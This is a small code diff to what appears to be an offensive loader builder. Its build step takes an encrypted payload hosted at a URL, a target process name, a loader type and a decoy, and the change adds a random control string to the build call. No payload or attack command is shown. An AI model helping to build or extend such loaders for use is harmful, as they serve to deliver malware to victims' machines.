@@ -1,6 +1,7 @@
 import os
 import time
 import json
+import random
 from Cast.cli import *
 from Cast.local_load import *
 from Cast.encryptor import *
@@ -102,8 +103,10 @@ Please host the encrypted.bin at {Url}
         print(f"\n[+] Template saved at {build_folder}")
     else:
         print(f"\n[!] Failed to save template at {build_folder}")
+    
+    Control_String = random.randint(100000, 999999)
 
-    if not build(Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
+    if not build(Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy, Control_String):
         print(f"""
 [+] Loader Built Successfully! At {build_folder}
     
